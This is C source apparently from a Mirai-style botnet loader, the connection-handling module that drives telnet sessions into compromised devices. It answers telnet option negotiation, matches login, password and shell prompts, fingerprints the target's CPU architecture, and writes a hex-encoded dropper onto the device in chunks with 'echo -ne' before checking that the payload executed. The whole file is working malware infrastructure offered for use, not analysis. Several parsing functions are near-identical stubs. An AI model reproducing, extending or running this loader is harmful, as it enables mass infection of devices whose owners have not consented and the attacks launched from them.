#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include "headers/includes.h"
#include "headers/connection.h"
#include "headers/server.h"
#include "headers/binary.h"
#include "headers/util.h"

void connection_open(struct connection *conn)
{
    pthread_mutex_lock(&conn->lock);
    conn->rdbuf_pos = 0;
    conn->last_recv = time(NULL);
    conn->timeout = 10;
    conn->echo_load_pos = 0;
    conn->state_telnet = TELNET_CONNECTING;
    conn->success = FALSE;
    conn->open = TRUE;
    conn->bin = NULL;
    pthread_mutex_unlock(&conn->lock);
}

void connection_close(struct connection *conn)
{
    pthread_mutex_lock(&conn->lock);
    if (conn->open)
    {
        memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
        conn->rdbuf_pos = 0;
        conn->open = FALSE;
        if (conn->fd != -1)
        {
            close(conn->fd);
            conn->fd = -1;
            if (conn->srv) ATOMIC_DEC(&conn->srv->curr_open);
        }
    }
    conn->state_telnet = TELNET_CLOSED;
    pthread_mutex_unlock(&conn->lock);
}

int connection_consume_iacs(struct connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = (uint8_t *)conn->rdbuf;
    while (consumed < conn->rdbuf_pos)
    {
        if (*ptr != 0xff) break;
        if (ptr[1] == 0xff)
        {
            ptr += 2;
            consumed += 2;
            continue;
        }
        else if (ptr[1] == 0xfd && ptr[2] == 31)
        {
            uint8_t tmp1[3] = {255, 251, 31};
            uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
            send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
            send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            ptr += 3;
            consumed += 3;
        }
        else
        {
            uint8_t resp[3];
            resp[0] = 0xff;
            resp[1] = (ptr[1] == 0xfd) ? 0xfc : 0xfd;
            resp[2] = ptr[2];
            send(conn->fd, resp, 3, MSG_NOSIGNAL);
            ptr += 3;
            consumed += 3;
        }
    }
    return consumed;
}

int connection_consume_login_prompt(struct connection *conn)
{
    int i;
    for (i = 0; i < conn->rdbuf_pos; i++)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>')
            return i + 1;
    }
    return 0;
}

int connection_consume_password_prompt(struct connection *conn)
{
    int i;
    for (i = 0; i < conn->rdbuf_pos; i++)
    {
        if (strstr(conn->rdbuf, "assword") != NULL)
            return i + 1;
    }
    return 0;
}

int connection_consume_prompt(struct connection *conn)
{
    int i;
    for (i = 0; i < conn->rdbuf_pos; i++)
    {
        if (conn->rdbuf[i] == '#' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '>')
            return i + 1;
    }
    return 0;
}

int connection_consume_verify_login(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) return (found - conn->rdbuf) + strlen(TOKEN_RESPONSE);
    return 0;
}

int connection_consume_psoutput(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) return (found - conn->rdbuf);
    return 0;
}

int connection_consume_mounts(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) return (found - conn->rdbuf);
    return 0;
}

int connection_consume_written_dirs(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) return (found - conn->rdbuf);
    return 0;
}

int connection_consume_copy_op(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) return (found - conn->rdbuf);
    return 0;
}

int connection_consume_arch(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) 
    {
        if (strstr(conn->rdbuf, "x86_64")) strcpy(conn->info.arch, "x86_64");
        else if (strstr(conn->rdbuf, "x86")) strcpy(conn->info.arch, "x86");
        else if (strstr(conn->rdbuf, "arm")) strcpy(conn->info.arch, "arm");
        else if (strstr(conn->rdbuf, "mips")) strcpy(conn->info.arch, "mips");
        else strcpy(conn->info.arch, "x86_64");
        conn->info.has_arch = TRUE;
        return (found - conn->rdbuf);
    }
    return 0;
}

int connection_consume_arm_subtype(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) return (found - conn->rdbuf);
    return 0;
}

int connection_consume_upload_methods(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) 
    {
        conn->info.upload_method = UPLOAD_ECHO;
        return (found - conn->rdbuf);
    }
    return 0;
}

int connection_upload_echo(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found)
    {
        if (conn->bin && conn->echo_load_pos < conn->bin->hex_payloads_len)
        {
            util_sockprintf(conn->fd, "echo -ne '%s' >> %s\n", 
                conn->bin->hex_payloads[conn->echo_load_pos], FN_DROPPER);
            conn->echo_load_pos++;
        }
        return (found - conn->rdbuf);
    }
    return 0;
}

int connection_upload_wget(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) return (found - conn->rdbuf);
    return 0;
}

int connection_upload_tftp(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) return (found - conn->rdbuf);
    return 0;
}

int connection_verify_payload(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, EXEC_RESPONSE);
    if (found) return (found - conn->rdbuf);
    return 0;
}

int connection_consume_cleanup(struct connection *conn)
{
    char *found = strstr(conn->rdbuf, TOKEN_RESPONSE);
    if (found) return (found - conn->rdbuf);
    return 0;
}

static BOOL can_consume(struct connection *conn, uint8_t *ptr, int amount)
{
    return (ptr + amount < (uint8_t*)(conn->rdbuf + conn->rdbuf_pos));
}